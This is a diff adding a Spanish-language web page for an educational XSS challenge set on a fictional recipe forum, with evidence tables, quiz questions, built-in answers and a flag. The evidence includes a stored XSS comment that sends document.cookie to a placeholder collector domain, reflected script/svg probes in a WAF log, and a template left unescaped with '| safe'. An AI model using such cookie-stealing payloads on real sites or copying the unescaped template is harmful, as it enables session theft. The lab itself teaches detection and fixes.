@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Caza el comentario trampa · Labs N4zar1</title>
+<meta name="description" content="Reto de XSS: un foro de recetas con un comentario que no es texto. Encuentra el XSS almacenado en la base de datos, la regla del WAF que lo vio, por qué no lo paró y el arreglo que cierra el agujero.">
+<meta name="theme-color" content="#040a1c">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}pre.code{margin:0;padding:16px 18px;overflow:auto;font:500 14px/1.6 var(--mono);color:var(--fg2)}pre.code b{color:var(--alert);font-weight:700}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="30" height="30">N4zar1 <span class="sub">Labs</span></a>
+    <nav><a class="opc" href="../index.html">Todos los labs</a><a data-goatcounter-click="ir-a-tienda" href="https://tienda.n4zar1.com">Tienda</a></nav>
+  </header>
+
+  <h1>Caza el comentario trampa</h1>
+  <p class="lede">Medio · ~12 min · Basado en el vídeo «Esto no es un comentario: es un programa (XSS)».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Recetas de Ana, un foro de cocina ficticio. Lunes 2/11. Varios usuarios dicen que alguien ha entrado en su cuenta sin saber su contraseña, y todos habían leído los comentarios de la tarta de queso. Ana te pasa los comentarios tal cual están guardados en la base de datos, el registro de su WAF, la plantilla que pinta los comentarios con las cabeceras que devuelve su web, y lo que vio el navegador de una de las víctimas.</p>
+    <p><b>Tu misión:</b> encuentra el comentario que no es texto (un XSS), cómo se ejecuta, qué vio el WAF y por qué no lo paró, adónde se fueron las sesiones y qué arreglo cierra el agujero. Chuleta: un XSS es texto que la web mete en su HTML sin escaparlo, así que el navegador de quien lo lee lo trata como código. Ojo: no todo lo que lleva un <code>&lt;</code> es un ataque.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · Base de datos › tabla comentarios (receta 77, tarta de queso)</h3>
+      <span class="tools"><input id="q1" placeholder="Buscar (usuario, texto…)" aria-label="Buscar en los comentarios"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · WAF (OWASP Core Rule Set) · registro del 2/11</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (IP, ruta, regla…)" aria-label="Buscar en el registro del WAF"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · La web por dentro: plantilla de los comentarios y cabeceras de la respuesta</h3></div>
+    <pre class="code">{# plantillas/receta.html #}
+{% for c in comentarios %}
+  &lt;div class="comentario"&gt;
+    &lt;b&gt;{{ c.usuario }}&lt;/b&gt;
+    &lt;p&gt;<b>{{ c.texto | safe }}</b>&lt;/p&gt;
+  &lt;/div&gt;
+{% endfor %}
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: sesion=8f3a9c41d2e07b55; Path=/; Secure
+X-Frame-Options: SAMEORIGIN
+(no hay cabecera Content-Security-Policy)</pre>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · Navegador de Lucía (víctima) › Herramientas de desarrollo › Red, al abrir la receta</h3>
+      <span class="tools"><input id="q4" placeholder="Buscar (dominio, ruta…)" aria-label="Buscar en las peticiones"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría Ana: borrar el comentario 1046 y quitar el <code>| safe</code> de la plantilla (la plantilla ya escapa sola), cerrar todas las sesiones abiertas para que las cookies robadas dejen de valer, marcar la cookie de sesión como <code>HttpOnly</code>, añadir una <code>Content-Security-Policy</code> sin <code>'unsafe-inline'</code>, pasar el WAF de «solo detectar» a bloquear después de probarlo y buscar en el registro cualquier otra petición de <code>203.0.113.66</code> o hacia <code>recolector.example</code>. Y avisar a los usuarios afectados.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Foro, personas, dominios, IPs y cookies ficticios; nada sale de tu navegador. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+
+makeTable({
+  el: $('ev1'),
+  cols: ['id', 'Fecha', 'Usuario', 'texto (tal cual está guardado)'],
+  rows: [
+    ['1039', '01/11 18:02', 'marta_cocina', '¡Me salió perfecta! La repetiré el domingo'],
+    ['1040', '01/11 19:15', 'pepe.horno', '¿Con qué queso la hiciste?'],
+    ['1041', '01/11 21:40', 'ana_recetas', 'Pepe: con queso crema normal. <3'],
+    ['1042', '02/11 08:11', 'lauri.dulce', 'Con 2 huevos sale igual: 3 > 2, pero no hace falta'],
+    ['1043', '02/11 09:05', 'cocinillas_88', 'Para la base: <b>galletas María</b>, no digestive'],
+    ['1044', '02/11 09:58', 'usuario_123', '¡Qué pinta! Mirad la foto de la mía:'],
+    ['1045', '02/11 09:59', 'usuario_123', 'jaja'],
+    ['1046', '02/11 10:03', 'usuario_123', '<img src=x onerror="fetch(\'https://recolector.example/c?s=\'+document.cookie)">'],
+    ['1047', '02/11 11:20', 'lucia_m', 'Yo la hice sin azúcar y genial'],
+  ],
+  filters: [{el: $('q1'), test: q()}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'IP', 'Petición', 'Regla', 'Acción'],
+  rows: [
+    ['09:31:12', '198.51.100.7', 'GET /receta/77', '-', 'pass'],
+    ['09:52:40', '203.0.113.66', 'GET /buscar?q=<script>alert(1)<\/script>', '941110 XSS Filter - Category 1: Script Tag Vector', 'block (403)'],
+    ['09:53:02', '203.0.113.66', 'GET /buscar?q=<svg/onload=alert(1)>', '941100 XSS Attack Detected via libinjection', 'block (403)'],
+    ['09:58:21', '203.0.113.66', 'POST /receta/77/comentar  texto=¡Qué pinta!…', '-', 'pass'],
+    ['10:03:47', '203.0.113.66', 'POST /receta/77/comentar  texto=<img src=x onerror=…>', '941120 XSS Filter - Category 2: Event Handler Vector', 'pass (DetectionOnly: /comentar en modo solo detección)'],
+    ['10:40:05', '192.0.2.40', 'GET /receta/77', '-', 'pass'],
+    ['11:19:58', '192.0.2.88', 'POST /receta/77/comentar  texto=Yo la hice sin…', '-', 'pass'],
+  ],
+  cls: r => r[4].startsWith('block') ? 'w' : '',
+  filters: [{el: $('q2'), test: q()}],
+});
+
+makeTable({
+  el: $('ev4'),
+  cols: ['Hora', 'Método', 'URL', 'Estado', 'Iniciador'],
+  rows: [
+    ['11:20:31', 'GET', 'https://recetas-de-ana.example/receta/77', '200', 'document'],
+    ['11:20:31', 'GET', 'https://recetas-de-ana.example/static/foro.css', '200', 'receta/77'],
+    ['11:20:32', 'GET', 'https://recetas-de-ana.example/receta/x', '404', 'receta/77 (img)'],
+    ['11:20:32', 'GET', 'https://recolector.example/c?s=sesion=8f3a9c41d2e07b55', '200', 'receta/77 (script)'],
+    ['11:20:33', 'GET', 'https://recetas-de-ana.example/static/fotos/tarta.jpg', '200', 'receta/77'],
+  ],
+  filters: [{el: $('q4'), test: q()}],
+});
+
+runLab('comentario-trampa', [
+  {q: '¿Cuál es el id del comentario que es un XSS?', type: 'text', ph: 'id',
+   accept: a => norm(a).replace(/\s/g, '') === '1046',
+   hint: 'Busca en la evidencia 1 un comentario que, en vez de texto, sea una etiqueta HTML con algo que se ejecute.',
+   explain: '<b>1046.</b> Es una etiqueta <code>&lt;img&gt;</code> con una imagen que no existe (<code>src=x</code>) y un <code>onerror</code>: cuando la imagen falla, el navegador ejecuta lo que hay dentro. Los demás <code>&lt;</code> y <code>&gt;</code> son inofensivos: <code>&lt;3</code> es un corazón y <code>3 &gt; 2</code> es una cuenta.'},
+  {q: 'El comentario 1043 lleva <code>&lt;b&gt;</code> y en la web sale en negrita. ¿Es un ataque?', type: 'choice',
+   options: ['Sí, es igual de grave que el 1046', 'No hace daño, pero demuestra que la web pinta el HTML de los usuarios sin escaparlo: es el mismo agujero que aprovecha el 1046', 'No, porque &lt;b&gt; no es una etiqueta HTML'], correct: 1,
+   explain: '<b>Es la pista.</b> Si escribes <code>&lt;b&gt;</code> y la web lo pinta en negrita, está obedeciendo tu HTML. Con <code>&lt;b&gt;</code> no pasa nada; con <code>onerror</code> o <code>&lt;script&gt;</code>, sí.'},
+  {q: '¿Qué atributo hace que se ejecute el código del comentario 1046?', type: 'text', ph: 'atributo',
+   accept: a => ['onerror', 'onerror='].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Es un manejador de eventos: empieza por «on».',
+   explain: '<b>onerror.</b> No hace falta <code>&lt;script&gt;</code>: un manejador de eventos dentro de una etiqueta normal también ejecuta JavaScript, y a veces se cuela por filtros que solo buscan «script».'},
+  {q: '¿Qué regla del WAF lo detectó? (el número)', type: 'text', ph: '9xxxxx',
+   accept: a => norm(a).replace(/\s/g, '') === '941120',
+   hint: 'Busca la petición de las 10:03 en la evidencia 2.',
+   explain: '<b>941120</b>, «Event Handler Vector» del OWASP Core Rule Set: salta con atributos como <code>onerror=</code> u <code>onload=</code>. La 941110 salta con <code>&lt;script&gt;</code> y la 941100 con la librería libinjection.'},
+  {q: 'Si el WAF lo vio, ¿por qué llegó a la base de datos?', type: 'choice',
+   options: ['Porque el WAF falló y no lo vio', 'Porque la ruta /comentar estaba en modo «solo detección»: el WAF apuntó la alerta pero dejó pasar la petición', 'Porque el atacante usó otra IP'], correct: 1,
+   wrong: '✗ Mira la columna Acción de la petición de las 10:03.',
+   explain: '<b>Modo solo detección.</b> Muchos WAF se ponen así al principio para no bloquear a usuarios legítimos. La alerta existe, pero si nadie la mira, no sirve de nada. Minutos antes, los intentos en /buscar sí se bloquearon (403).'},
+  {q: '¿Este XSS es reflejado o almacenado?', type: 'choice',
+   options: ['Reflejado: viaja en un enlace y solo afecta a quien lo abre', 'Almacenado: se guardó en la base de datos y se ejecuta a todo el que abre la receta'], correct: 1,
+   explain: '<b>Almacenado.</b> Los intentos de las 09:52 en <code>/buscar?q=</code> eran reflejados (el código viajaba en la URL) y el WAF los bloqueó. El de las 10:03 quedó guardado: le salta a cada persona que lee los comentarios.'},
+  {q: '¿A qué dominio se mandaron las cookies de sesión?', type: 'text', ph: 'dominio',
+   accept: a => ['recolector.example', 'https://recolector.example'].includes(norm(a).replace(/\s/g, '').replace(/\/$/, '')),
+   hint: 'Mira la evidencia 4: qué petición sale hacia un dominio que no es el del foro.',
+   explain: '<b>recolector.example.</b> El navegador de Lucía mandó su cookie <code>sesion=8f3a9c41d2e07b55</code> a ese dominio. Con ella, el atacante entra en su cuenta sin contraseña hasta que la sesión se cierre.'},
+  {q: 'Ana puede hacer tres cambios. ¿Cuál cierra el agujero de raíz?', type: 'choice',
+   options: ['Añadir la cabecera Content-Security-Policy', 'Escapar la salida: quitar el «| safe» de la plantilla para que el texto de los usuarios se pinte como texto y no como HTML', 'Marcar la cookie de sesión como HttpOnly'], correct: 1,
+   wrong: '✗ Ese cambio ayuda, pero el código seguiría entrando en la página. Mira la plantilla de la evidencia 3.',
+   explain: '<b>Escapar la salida.</b> Con <code>| safe</code> la plantilla pinta el texto tal cual; sin él, <code>&lt;</code> se convierte en <code>&amp;lt;</code> y el comentario se ve como texto. La CSP y HttpOnly son capas extra: la CSP impide que se ejecute JavaScript en línea y HttpOnly impide que JavaScript lea la cookie, pero ninguna de las dos evita, por ejemplo, un formulario de login falso pintado dentro de la página.'},
+  {q: '¿Qué atributo falta en la cabecera Set-Cookie para que JavaScript no pueda leer la sesión?', type: 'text', ph: 'atributo',
+   accept: a => norm(a).replace(/[\s;]/g, '') === 'httponly',
+   hint: 'Mira la línea Set-Cookie de la evidencia 3: tiene Path y Secure, pero le falta uno.',
+   explain: '<b>HttpOnly.</b> Con <code>Set-Cookie: sesion=…; Path=/; Secure; HttpOnly</code>, <code>document.cookie</code> no la devuelve y el <code>onerror</code> se habría llevado una cadena vacía.'},
+], 'N4{escapa_la_salida_no_el_comentario}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
